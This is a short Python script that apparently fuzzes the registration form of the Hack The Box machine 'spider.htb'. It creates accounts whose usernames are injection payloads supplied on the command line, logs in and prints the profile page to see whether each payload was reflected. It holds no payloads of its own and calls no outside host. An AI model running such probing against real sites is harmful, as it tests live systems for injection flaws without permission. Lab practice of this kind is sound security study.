import requests
import sys
from bs4 import BeautifulSoup
import time
import re


def sendPayload(line):



    with requests.Session() as s:
        register = 'http://spider.htb/register'
        myobj = {'username': line , 'confirm_username': line, 'password':'test', 'confirm_password':'test'}
        x = s.post(register, data = myobj, allow_redirects=False)
        results = BeautifulSoup(x.content, 'html.parser')
        links = results.find_all('a')
        uuid = ''
        uuid_link = ''

        for link in links:
            if (link.text.startswith('/login')):
                uuid_link = link.text

        if (uuid_link == ''):           
            print("cant create user with payload: " + line)
        else:
            uuid = uuid_link.replace('/login?uuid=','')
            #print(uuid)       
            login = 'http://spider.htb/login'
            myobj = {'username': uuid ,'password':'test'}
            
            # login
            time.sleep(1)
            x = s.post(login, data = myobj)
            view = 'http://spider.htb/view'
            main = 'http://spider.htb/'
            info = 'http://spider.htb/user'
            
            # # request main site
            # time.sleep(1)
            # x = s.get(main)
            # results = BeautifulSoup(x.content, 'html.parser')
            # payload_resp = results.find_all('a')
            # for pay in payload_resp:
            #     if (pay.text.startswith('Logout (logged in as')):
            #         print(pay.text)
            #         user = pay.text.replace('Logout (logged in as ','')
            #         if ( user != line + ')'):
            #             print('found Exploit!!!!!!!!!!!!!!!!!!')
            #             print("Payload: " + line)
            
            # # request view site
            # time.sleep(1)
            # x = s.get(view)
            # results = BeautifulSoup(x.content, 'html.parser')
            # payload_resp = results.find_all('h2','ui header')
            # for pay in payload_resp:
            #     if (pay.text.startswith('Current')):
            #         if ( (pay.text.replace('Current user: ','') != line)):
            #             print('found Exploit!!!!!!!!!!!!!!!!!!')
            #             print("Payload: " + line)
            
            # request view information site
            time.sleep(1)
            x = s.get(info)
            results = BeautifulSoup(x.content, 'html.parser')
            payload_resp = results.find_all('div','field')
            #found = re.search('value="(.*)', str(payload_resp)).group(1)
            #if ( found != line):
            print('Exploiting:')
            print("Payload: " + line +" results in: " + str(payload_resp))
                    
        


sendPayload(sys.argv[1])

# 'with open(sys.argv[1]) as payload:
#     while True:
#         line = payload.readline()
#         if (len(line) < 11):
#             sendPayload(line)
#             time.sleep(1)
#         if not line:
#             break'


    


